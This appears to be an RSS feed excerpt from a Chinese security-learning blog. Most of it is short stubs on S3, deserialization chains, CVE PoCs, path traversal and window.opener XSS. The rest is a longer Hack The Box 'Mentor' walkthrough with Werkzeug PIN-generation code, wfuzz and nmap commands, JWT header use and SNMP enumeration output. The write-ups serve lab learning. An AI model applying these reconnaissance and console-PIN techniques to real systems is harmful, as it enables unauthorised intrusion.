+            <content:encoded><![CDATA[<p>公开靶场:<a href="http://flaws.cloud/">http://flaws.cloud/</a></p>
+<h2>S3常见的安全问题</h2>
+<h3>安全问题概括</h3>
+<p>概括如下：</p>
+<ol>
+<li>s3桶名为全局变量，默认是aws上任意两个用户不能有</li>
+</ol>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[CC1链 学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/cc1-lian-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/cc1-lian-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>CC1链</h1>
+<h2>前言</h2>
+<p>大佬们文章很细很全, 为了给自己捋思路…….就比如: 把有疑惑的点反复看,然后在不同的文章里(以及google搜索,补充基础知识etc)找到”为什么这里用XXXX”的原因</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Code-Audit-Challenges#php 刷题记录【历史笔记】]]></title>
+            <link>https://1dayluo.github.io/posts/history/code-audit-challengesphp-shua-ti-ji-lu-li-shi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/code-audit-challengesphp-shua-ti-ji-lu-li-shi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<blockquote>
+<p>堆点安全的博文，一直以来是笔记党。把去年8月的刷题笔记发上来。正在做的攻防世界没做啥刷题笔记，就用这篇代替啦（bu<br>
+今年光顾着写代码了，安全啥的给落下了还是要继续努力&gt;-&lt;  （而且发现好久不巩固是会忘记的，又要再次巩固学习一次了）</p>
+</blockquote>
+<p>题目列表</p>
+<ul>
+<li><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a><br>
+<a href="https://blog.szfszf.top/tech/code-audit-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://blog.szfszf.top/tech/code-audit-challenge-代码审计练习笔记/</a></li>
+</ul>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[CVE-2018-0114 POC编写与实践]]></title>
+            <link>https://1dayluo.github.io/posts/history/cve-2018-0114</link>
+            <guid>https://1dayluo.github.io/posts/history/cve-2018-0114</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>一篇水文。。。起名困难症（改了几次） 参考思路就行</p>
+<h2>POC构造思路</h2>
+<ol>
+<li>先生成rsa密钥 ：public key 和private key</li>
+</ol>
+<pre><code class="language-python">import rsa 
+</code></pre>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[CVE-2023-50164 漏洞分析与学习]]></title>
+            <link>https://1dayluo.github.io/posts/history/cve-2023-50164-lou-dong-fen-xi-yu-xue-xi</link>
+            <guid>https://1dayluo.github.io/posts/history/cve-2023-50164-lou-dong-fen-xi-yu-xue-xi</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>官方的主要修复有：</p>
+<ul>
+<li>**[Makes HttpParameters case-insensitive](<a href="https://github.com/apache/struts/commit/d8c">https://github.com/apache/struts/commit/d8c</a></li>
+</ul>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[更新了blog内的htb的文章,设置加密]]></title>
+            <link>https://1dayluo.github.io/posts/history/geng-xin-liao-blog-nei-de-htb-de-wen-zhang-she-zhi-jia-mi</link>
+            <guid>https://1dayluo.github.io/posts/history/geng-xin-liao-blog-nei-de-htb-de-wen-zhang-she-zhi-jia-mi</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p><img src="https://imgtu.com/i/HiARIA" alt=""></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[ Gogs RCE 历史漏洞学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<aside>
+💡 This exercise covers how to get code execution against the Git self hosted tool: Gogs.
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Google Dorking Learn]]></title>
+            <link>https://1dayluo.github.io/posts/history/google-dorking-learn</link>
+            <guid>https://1dayluo.github.io/posts/history/google-dorking-learn</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>Google Dorking Learn</h1>
+<p>Learn from: <a href="https://exposingtheinvisible.org/guides/google-dorking/">https://exposingtheinvisible.org/guides/google-dorking/</a></p>
+<h2>To d</h2>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[gruyere|笔记]一个web平台的漏洞学习笔记-]]></title>
+            <link>https://1dayluo.github.io/posts/history/gruyereorbi-ji-yi-ge-web-ping-tai-de-lou-dong-xue-xi-bi-ji-</link>
+            <guid>https://1dayluo.github.io/posts/history/gruyereorbi-ji-yi-ge-web-ping-tai-de-lou-dong-xue-xi-bi-ji-</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>Web Application Exploits and Defenses (<a href="http://google-gruyere.appspot.com">google-gruyere.appspot.com</a>) <br>
+据说是包括了所有web2.0的漏洞</p>
+<h2>使用前需知</h2>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[ 关于目录遍历漏洞中，非标准编码%C0%2F和%C0%AF均能代表/，且均在漏洞中生效的原理探索]]></title>
+            <link>https://1dayluo.github.io/posts/history/guan-yu-mu-lu-bian-li-lou-dong-zhong-fei-biao-zhun-bian-ma-c02f-he-c0af-jun-neng-dai-biao-qie-jun-zai-lou-dong-zhong-sheng-xiao-de-yuan-li-tan-suo</link>
+            <guid>https://1dayluo.github.io/posts/history/guan-yu-mu-lu-bian-li-lou-dong-zhong-fei-biao-zhun-bian-ma-c02f-he-c0af-jun-neng-dai-biao-qie-jun-zai-lou-dong-zhong-sheng-xiao-de-yuan-li-tan-suo</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>学习自下的回答，本内容为阅读对应资料后的笔记和自己的理解：<br>
+<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></p>
+<h2>基础知识</h2>
+<p>bits：组成bytes，是最小的单位</p>
+<p>bytes：由8个bits组成。</p>
+<h2>URL编码</h2>
+<p>URL编码-</p>
+<ul>
+<li>也叫百分比编码（<a href="https://en.wikipedia.org/wiki/Percent-encoding">https://en.wikipedia.org/wiki/Percent-encoding</a>）</li>
+<li>组成：%xx ，其中x代表一个十六进制的数字，能代表0-255内的数字</li>
+<li>%xx代表一个byte</li>
+</ul>
+<p>%C0%2F：对应十进制192 (1100 0000) 和175 (1010 1111),</p>
+<p>%C0%AF：对应十进制的192 (1100 0000)和47 (0010 1111)</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[关于opener的学习及利用]]></title>
+            <link>https://1dayluo.github.io/posts/history/guan-yu-opener-de-xue-xi-ji-li-yong</link>
+            <guid>https://1dayluo.github.io/posts/history/guan-yu-opener-de-xue-xi-ji-li-yong</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>window.opener 学习</h1>
+<p>[15:40]</p>
+<p>关于window.opener的补充学习：</p>
+<p><a href="https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d%5D(https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d)"></a></p>
+<p>还是从part1开始读起吧（</p>
+<p>学习的过程偶尔会发愁，遇到很多英文，我还是一个头两个大。但是还是啃吧）：</p>
+<p>part1：<a href="https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-1-c6be37701cab">https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-1-c6be37701cab</a></p>
+<p>和视频补充学习：<a href="https://www.youtube.com/watch?v=veXDFx2qJBk">https://www.youtube.com/watch?v=veXDFx2qJBk</a></p>
+<p><strong>part1介绍的内容：</strong></p>
+<ul>
+<li>opener 变量 以及如何与同源政策相关联。</li>
+<li>该变量如何呗滥用以实现接近客户端重定向</li>
+</ul>
+<p><strong>part2介绍的内容：</strong></p>
+<ul>
+<li>在part1概念的基础上探讨新型XSS向量</li>
+</ul>
+<p><strong>part3介绍的内容：</strong></p>
+<ul>
+<li>来混淆一些有趣的跨窗口<code>eval</code> 函数 从而在第四部分讨论通用XSS的问题</li>
+</ul>
+<h1>Part 1</h1>
+<h2>Introducing the window.opener variable</h2>
+<p>open 函数通常被用于在弹出的窗口中打开一个URL。这个函数经常被不良的网站打开烦人或恶意的广告，但是同样也有合法的使用。当你调用open函数，浏览器自动在新窗口中赋值一个变量指向打开该窗口的源窗口。这个变量自然地称作”opener‘</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[HTB] petpet rcbee ]]></title>
+            <link>https://1dayluo.github.io/posts/history/htb-petpet-rcbee</link>
+            <guid>https://1dayluo.github.io/posts/history/htb-petpet-rcbee</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>petpet rcbee</h1>
+<p><s>又是一道flask+python的题(后来发现无关)</s></p>
+<p><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/petpetrobee_1.png" alt="Untitled"></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[HTB] Templated | writeup]]></title>
+            <link>https://1dayluo.github.io/posts/history/htb-templated-or-writeup</link>
+            <guid>https://1dayluo.github.io/posts/history/htb-templated-or-writeup</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>Templated</h1>
+<p>是ssti漏洞.</p>
+<p>但是之前学习burpsuite下的题目的时候,没有学到这个.之前了解过概念.于是我专门回顾和学习了一下jinja2</p>
+<p>尝试访问不存在的路径:</p>
+<pre><code>payload : /xyz
+
+response : 发现会回显xyz在页面中
+</code></pre>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[ [HTB] 又一道writeup:Weather | 收获颇多]]></title>
+            <link>https://1dayluo.github.io/posts/history/htb-weather-App</link>
+            <guid>https://1dayluo.github.io/posts/history/htb-weather-App</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>Weather App</h1>
+<p>这道题值得慢慢啃,如果有缘看到我这篇writeup的话,建议你实在啃不下再看(或者只看卡住的地方)</p>
+<h2>题目分析</h2>
+<p>不管用burp抓包,还是分析源代码.均可以看到,天气的获取以POST方式请求了<code>/api/weather</code> 接口(源代码见<code>/static/js/main.js</code> )</p>
+<p>看源代码进行审计的时候,还发现了在<code>/static/host-unreachable.jpg</code> 下的一个图片</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[HTB]Backend - API]]></title>
+            <link>https://1dayluo.github.io/posts/history/htbbackend-api</link>
+            <guid>https://1dayluo.github.io/posts/history/htbbackend-api</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>Backend - API</h1>
+<p>突然想做这个box的起因是看到一条tweet，qwq 原来做box这么有用的嘛</p>
+<p>![Untitled](<a href="https://cdn.jsdelivr.net/gh/1d">https://cdn.jsdelivr.net/gh/1d</a></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[ HTB：Encoding]]></title>
+            <link>https://1dayluo.github.io/posts/history/htbencoding</link>
+            <guid>https://1dayluo.github.io/posts/history/htbencoding</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>标签：api, php, .git, ssrf, lfi to rce,post-commit hook,service</p>
+<p>………慢慢来，不要着急。打退役box积攒经验中…</p>
+<h2>Recon</h2>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[HTB:Forgot]]></title>
+            <link>https://1dayluo.github.io/posts/history/htbforgot</link>
+            <guid>https://1dayluo.github.io/posts/history/htbforgot</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>HTB：Forgot</h1>
+<h2>Recon</h2>
+<p>端口扫描结果</p>
+<p>1.nmap扫描结果：</p>
+<pre><code class="language-shell">PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp o</code></pre>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[HTB:Mentor]]></title>
+            <link>https://1dayluo.github.io/posts/history/htbmentor</link>
+            <guid>https://1dayluo.github.io/posts/history/htbmentor</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>HTB：Mentor</h1>
+<h2>RECON</h2>
+<p>是Flask（ <code>2.0.3</code>) 的网站，<strong>TCP</strong>端口扫描结果就是： <code>20</code>, <code>53</code> , <code>80</code> ，然后试着目录遍历（不过我第一次使用的字典暂时没有什么有价值的收获）和子域名，在这个同时我会去翻看网页源代码和其他信息</p>
+<p>在搜查的过程中，发现了使用到了 <code>Werkzeug</code> ，关于它的介绍如下：</p>
+<blockquote>
+<p>在Python Web开发中，Werkzeug通常与其他框架（如Flask、Django等）一起使用，作为这些框架的底层库。使用Werkzeug，开发人员可以更轻松地处理HTTP请求和响应，实现中间件（middleware）和拦截器（interceptor）等功能，以及进行调试和测试。</p>
+<p>总之，如果你在Python Web开发中需要处理HTTP请求和响应、实现中间件或进行调试和测试等任务，那么Werkzeug可能会是一个有用的技术栈</p>
+</blockquote>
+<p>在著名的<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">hackertricks</a>下去查看一些针对 <code>Werkzeug</code> 的攻击手段，这里发现原始网页对 <code>/consoel</code> 是禁止访问的，所以需要去想办法查看PIN number</p>
+<p>原理讲解：<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a></p>
+<p>PIN的生成主要在以下的两个list变量中</p>
+<pre><code class="language-python">probably_public_bits = [
+    username,
+    modname,
+    getattr(app, '__name__', getattr(app.__class__, '__name__')),
+    getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    str(uuid.getnode()),
+    get_machine_id(),
+]
+# getattr(app, '__name__', getattr (app .__ class__, '__name__')) is Flask 
+# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory
+# uuid.getnode() is the MAC address of the current computer, str (uuid.getnode ()) is the decimal expression of the mac address
+# get_machine_id() read the value in /etc/machine-id or /proc/sys/kernel/random/boot_i and return directly if there is
+</code></pre>
+<p>其中 mac地址在 <code>/proc/net/arp</code> （指的是Linux）</p>
+<p>然后挖掘了一下，发现不是这里的问题 🥲  我发现我老是把简单的问题想复杂……啊啊啊啊啊啊（菜狗痛苦.jpg)。然后直线距离会绕个弯走。但是等待扫描结果的过程真的好痛苦（菜狗痛苦×2.jpg)……</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230315.png" alt="Untitled"></p>
+<p>反复测试，最后子域名发现了（竟然是404）</p>
+<ul>
+<li>api.mentorquotes.htb</li>
+</ul>
+<p>同理，加入到 <code>/etc/hosts</code> 里。</p>
+<h2>子域名扫描</h2>
+<p>虽然我每个工具的命令都是单独总结的，但是偶尔贴一下吧</p>
+<pre><code class="language-python">wfuzz -c -w &lt;dict&gt; -u &quot;http://api.mentorquotes.htb/FUZZ&quot; --hc 404
+</code></pre>
+<p>结果</p>
+<pre><code class="language-python">=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                       
+=====================================================================
+000000004:   307        0 L      0 W        0 Ch        &quot;admin&quot;                                                                                                                                                                                       
+000000124:   200        30 L     62 W       969 Ch      &quot;docs&quot;                                                                                                                                                                                        
+000000205:   307        0 L      0 W        0 Ch        &quot;users&quot;
+000001440:   307        0 L      0 W        0 Ch        &quot;quotes&quot;
+000004658:   403        9 L      28 W       285 Ch      &quot;server-status&quot;
+
+</code></pre>
+<h2>/docs 探索</h2>
+<h3>Auth</h3>
+<p>以前也刷过关于api的box：<a href="https://1dayluo.github.io/post/htbbackend-api/">https://1dayluo.github.io/post/htbbackend-api/</a>   （这个还真的不错，当时刷过一次就觉得学到了很多）</p>
+<p>注册</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303151.png" alt="Untitled"></p>
+<p>登录</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303152.png" alt="Untitled"></p>
+<p>返回的内容是：</p>
+<pre><code class="language-python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0
+</code></pre>
+<h3>Users</h3>
+<p>直接用docs下的发起是失败的</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303153.png" alt="Untitled"></p>
+<p>然后我注意到了</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303154.png" alt="Untitled"></p>
+<p>把刚刚login的内容作为jwt传入到header里</p>
+<pre><code class="language-lua">GET /users/ HTTP/1.1
+Host: api.mentorquotes.htb
+accept: application/json
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+DNT: 1
+Referer: http://api.mentorquotes.htb/docs
+Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+sec-gpc: 1
+Connection: close
+</code></pre>
+<p>返回：</p>
+<pre><code class="language-lua">{&quot;detail&quot;:&quot;Only admin users can access this resource&quot;}
+</code></pre>
+<p>包括 <code>/users/{id}</code> 也是一样，虽然有跳转，但是最终还是提示只有管理员用户可以使用。看起来应该用了规则匹配，后面的 <code>/users/add</code> 应该也是同理</p>
+<h3>Quotes</h3>
+<p>也是一样的道理。</p>
+<ol>
+<li>quotes - GET</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303155.png" alt="Untitled"></p>
+<ol>
+<li>quotes - POST ： 提示只有管理员才可以</li>
+<li>quotes - PUT ： 提示只有管理员才可以</li>
+<li>quotes - POST ： 提示只有管理员才可以</li>
+<li>quotes - DELETE ： 提示只有管理员才可以</li>
+</ol>
+<h2>SNMP - private</h2>
+<p>api探索了好一阵，看哪里能获取管理员auth，但是无果。然后又回归到了大佬0xdf的博客（谢谢大佬TUT）</p>
+<p>我忽视了UDP port……</p>
+<pre><code class="language-bash">sudo nmap -p- -sU --min-rate 10000 -oA /tmp/nmap-udp 10.10.11.193
+
+# 扫描结果：
+# PORT    STATE SERVICE
+# 161/udp open  snmp
+</code></pre>
+<p>问chatGPT和newBing关于SNMP是干嘛的回答</p>
+<blockquote>
+<p>chatGPT:<br>
+一个网站可能需要使用SNMP来监控网络设备的状态和性能，以确保网络设备正常运行。例如，如果网站依赖于负载均衡器、路由器、交换机等网络设备，监控这些设备的状态和性能可以帮助管理员及时发现和解决网络问题，提高网络的可用性和可靠性。此外，SNMP还可以用于收集网站服务器的性能指标，如CPU利用率、内存使用率、磁盘空间等，以帮助管理员优化网站性能和资源利用率。</p>
+</blockquote>
+<p>Bing:</p>
+<blockquote>
+<p>您好，这是Bing。😊</p>
+<p>SNMP（简单网络管理协议）是一种网络协议，用于管理和监视IP网络中的网络设备，如服务器，工作站，路由器，交换机等<a href="https://www.pconline.com.cn/win11/1511/15111684.html">1</a>。一个网站可能需要用到SNMP的情况有：</p>
+<ul>
+<li>网站的管理员需要监控和配置网站的服务器或其他设备<a href="https://resources.infosecinstitute.com/topic/snmp-pentesting/">2</a>。</li>
+<li>网站的安全测试人员需要检测网站是否存在SNMP相关的漏洞<a href="https://blog.domotz.com/know-your-networks/snmp-port-number/">3</a> <a href="https://resources.infosecinstitute.com/topic/vulnerability-assessment-of-snmp-service-ii/">4</a>。</li>
+<li>网站的用户需要通过SNMP获取网站的性能或状态信息。</li>
+</ul>
+<p>您想了解更多关于SNMP的什么内容呢？</p>
+</blockquote>
+<p>恩……这波是bing赢了</p>
+<p>snmp除了用nmap外，还有以下工具：</p>
+<ul>
+<li><a href="https://github.com/SECFORCE/SNMP-Brute.git">https://github.com/SECFORCE/SNMP-Brute.git</a></li>
+<li><a href="https://github.com/trailofbits/onesixtyone">https://github.com/trailofbits/onesixtyone</a></li>
+</ul>
+<p>我用了snmp-brute。首先要根据README下载一些基础依赖。然后按照官方/help来的运行就好，</p>
+<p>工具捕获到的数据 （发现管理员邮箱）</p>
+<pre><code class="language-bash">################## Enumerating SYSTEM Table using: iso.3.6.1.2.1.1  (SYSTEM Info)
+	INFO
+	----	
+	STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
+	OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+	Timeticks: (6160235) 17:06:42.35
+	STRING: Me &lt;admin@mentorquotes.htb&gt;
+	STRING: mentor
+	STRING: Sitting on the Dock of the Bay
+	INTEGER: 72
+
+################## Enumerating Interfaces Table using: -Ci (Interface Info)
+	Name   Mtu Network Address Ipkts Ierrs Opkts Oerrs Queue
+
+################## Enumerating Routing Table using: -Cr (Route Info)
+
+################## Enumerating Netstat Table using:  (Netstat)
+	Active Internet (udp) Connections
+	Proto Local Address               Remote Address                PID
+	udp4  *.*                         *.*                             0
+</code></pre>
+<p>这里不太会，就跟着佬们的writeup来学习了，</p>
+<p>然后我用了 <code>snmpbulkwalk</code> 工具</p>
+<pre><code class="language-bash">HOST-RESOURCES-MIB::hrSWRunPath.921 = STRING: &quot;/usr/libexec/udisks2/udisksd&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.927 = STRING: &quot;/usr/sbin/ModemManager&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1200 = STRING: &quot;/usr/sbin/cron&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1208 = STRING: &quot;/usr/sbin/snmpd&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1221 = STRING: &quot;/usr/bin/containerd&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1242 = STRING: &quot;/sbin/agetty&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1243 = STRING: &quot;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1254 = STRING: &quot;/usr/sbin/apache2&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1340 = STRING: &quot;/usr/bin/dockerd&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1691 = STRING: &quot;/bin/bash&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1742 = STRING: &quot;/usr/bin/docker-proxy&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1755 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1781 = STRING: &quot;postgres&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1838 = STRING: &quot;postgres: checkpointer &quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1839 = STRING: &quot;postgres: background writer &quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1840 = STRING: &quot;postgres: walwriter &quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1841 = STRING: &quot;postgres: autovacuum launcher &quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1842 = STRING: &quot;postgres: stats collector &quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1843 = STRING: &quot;postgres: logical replication launcher &quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1849 = STRING: &quot;/usr/bin/docker-proxy&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1863 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1889 = STRING: &quot;python3&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1958 = STRING: &quot;/usr/bin/docker-proxy&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1971 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.1993 = STRING: &quot;python&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.2007 = STRING: &quot;/usr/local/bin/python3&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.2008 = STRING: &quot;/usr/local/bin/python3&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.2092 = STRING: &quot;postgres: postgres mentorquotes_db 172.22.0.1(46844) idle&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.2110 = STRING: &quot;/usr/bin/python3&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.26610 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.26614 = STRING: &quot;postgres: postgres mentorquotes_db 172.22.0.1(60892) idle&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91129 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91137 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91143 = STRING: &quot;sh&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91144 = STRING: &quot;/bin/sh&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91148 = STRING: &quot;python3&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91149 = STRING: &quot;/bin/sh&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91419 = STRING: &quot;/usr/libexec/upowerd&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91862 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91958 = STRING: &quot;/usr/sbin/apache2&quot;
+HOST-RESOURCES-MIB::hrSWRunPath.91959 = STRING: &quot;/usr/sbin/apache2&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.556 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.557 = STRING: &quot;-d -s&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.561 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.581 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.684 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.685 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.715 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.717 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.737 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.738 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.758 = STRING: &quot;-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: &quot;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.912 = STRING: &quot;--foreground&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.913 = STRING: &quot;/usr/bin/networkd-dispatcher --run-startup-triggers&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.914 = STRING: &quot;--no-debug&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.915 = STRING: &quot;-n -iNONE&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.927 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1200 = STRING: &quot;-f -P&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1208 = STRING: &quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1221 = &quot;&quot;
